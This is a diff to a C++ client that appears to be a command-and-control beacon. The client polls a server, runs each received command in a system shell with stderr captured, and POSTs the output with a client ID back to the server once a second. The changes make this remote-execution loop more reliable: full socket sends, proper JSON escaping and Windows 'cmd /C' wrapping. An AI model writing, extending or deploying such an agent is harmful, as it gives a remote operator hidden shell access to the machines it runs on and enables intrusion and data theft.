@@ -23,6 +23,24 @@ using socket_t = SOCKET;
 using socket_t = int;
 #endif
 
+// send the entire buffer to the socket
+static bool send_all(socket_t sock, const char* buf, size_t len) {
+    size_t sent = 0;
+    while (sent < len) {
+#ifdef _WIN32
+        int n = send(sock, buf + sent, (int)(len - sent), 0);
+        if (n == SOCKET_ERROR)
+            return false;
+#else
+        ssize_t n = send(sock, buf + sent, len - sent, 0);
+        if (n == -1)
+            return false;
+#endif
+        sent += (size_t)n;
+    }
+    return true;
+}
+
 std::string send_request(const addrinfo* res, const std::string& req) {
     socket_t sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
     if (sock == INVALID_SOCKET) {
@@ -39,7 +57,14 @@ std::string send_request(const addrinfo* res, const std::string& req) {
 #endif
         return "";
     }
-    send(sock, req.c_str(), (int)req.size(), 0);
+    if (!send_all(sock, req.c_str(), req.size())) {
+#ifdef _WIN32
+        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
+#else
+        perror("send");
+#endif
+    }
+
     char buf[4096];
     std::string resp;
     int n;
@@ -108,10 +133,13 @@ int main(int argc, char* argv[]) {
         if (!command.empty()) {
             std::cout << "Command: " << command << std::endl;
             std::string result;
+
 #ifdef _WIN32
-            FILE* pipe = _popen(command.c_str(), "r");
+            std::string fullCmd = "cmd /C " + command + " 2>&1";
+            FILE* pipe = _popen(fullCmd.c_str(), "r");
 #else
-            FILE* pipe = popen(command.c_str(), "r");
+            std::string fullCmd = command + " 2>&1";
+            FILE* pipe = popen(fullCmd.c_str(), "r");
 #endif
             if (pipe) {
                 char buf[256];
@@ -128,27 +156,28 @@ int main(int argc, char* argv[]) {
             // escape backslashes and quotes for JSON
             std::string esc;
             for (char ch : result) {
-                if (ch == '\\' || ch == '"') esc += '\\';
-                if (ch == '\n') {
-                    esc += "\n";
-                } else if (ch == '\r') {
-                    continue;
-                } else {
-                    esc += ch;
+                switch (ch) {
+                    case '\\': esc += "\\\\"; break;
+                    case '"':  esc += "\\\""; break;
+                    case '\n': esc += "\\n"; break;
+                    case '\r': break;
+                    default:    esc += ch; break;
                 }
             }
             std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + esc + "\"}";
-
             std::string resReq = "POST /result HTTP/1.1\r\n";
             resReq += "Host: " + host + "\r\n";
             resReq += "Content-Type: application/json\r\n";
             resReq += "Content-Length: " + std::to_string(resBody.size()) + "\r\n\r\n";
             resReq += resBody;
             send_request(res, resReq);
+        } else {
+            std::cout << "waiting..." << std::endl;
         }
 #ifdef _WIN32
         Sleep(1000);
 #else
+
         sleep(1);
 #endif
     }
